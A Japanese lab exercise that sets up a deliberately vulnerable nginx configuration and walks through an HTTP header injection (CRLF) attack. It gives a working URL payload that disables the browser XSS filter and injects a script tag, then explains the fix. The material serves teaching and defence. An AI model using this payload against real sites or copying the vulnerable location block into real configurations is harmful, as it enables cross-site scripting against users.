## 演習

### アプリケーションの起動

以下のコマンドをターミナルで実行してみましょう。

```bash
docker-compose up
```

### アプリケーションの概要

このアプリケーションでは、nginxの設定であえてHTTPヘッダインジェクションを可能にする設定を加えることで、
特定のURL `http://127.0.0.1/v1/*.json` (`*`は任意の文字列)に対して、`X-Action: (任意の文字列)`というHTTPヘッダを返すようにしています。
この任意の文字列の中で改行検査をしていないため、HTTPヘッダインジェクションを起こすことができます。

### 攻撃

1. 以下のURLにアクセスします: `http://localhost/v1/see%0d%0aX-XSS-Protection:%200%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E.json`
2. インジェクションによるJavaScriptのalertダイアログが上がってきます。

この攻撃では、改行や特殊文字を解釈して示すと、以下の内容をHTTPヘッダインジェクションしていることになります。

```
see
X-XSS-Protection: 0
Content-Type: text/html

<script>alert(1)</script>.json
```

この攻撃の効果としては以下を意図しています。

* 最初の `see` は `X-Action: see` として出力される（攻撃としての効果はない）
* `X-XSS-Protection: 0` とすることでブラウザのXSSフィルタを無効化する
* `Content-Type: text/html` とすることで `<script>` タグによるXSSを使えるようになる

実際のHTTPでの返答例は次のようになります。

```
HTTP/1.1 200 OK
Server: nginx/1.15.5
Date: Wed, 31 Oct 2018 23:45:04 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 64
Connection: keep-alive
X-Action: see
X-XSS-Protection: 0
Content-Type: text/html

<script>alert(1)</script>

{"comment": "This is v1 endpoint.",
```

なお、`Content-Length: 64` となっているのは、nginx.confのreturnで返す以下の内容が64文字になっているためです。インジェクションによってこのJSONの返答の内容の前にヘッダが追加されるため、その分後から切り詰められています。

```
{"comment": "This is v1 endpoint.", "url": "http://example.com"}
```

### 攻撃の対策

この攻撃は、nginx.confのこの部分によって引き起こされたものですので、以下の該当部分を削除すれば攻撃の可能性はなくなります。

```
        location ~ /v1/((?<action>[^.]*)\.json)?$ {
            # inject received content
            add_header X-Action $action;
            return 200 '{"comment": "This is v1 endpoint.", "url": "http://example.com"}';
        }
```

この設定の具体的な問題としては

* 変数 `$action` を設定する正規表現で改行コードの検査をしていない
* `add_header` にて改行コードの検査をしていない

ことが挙げられます。
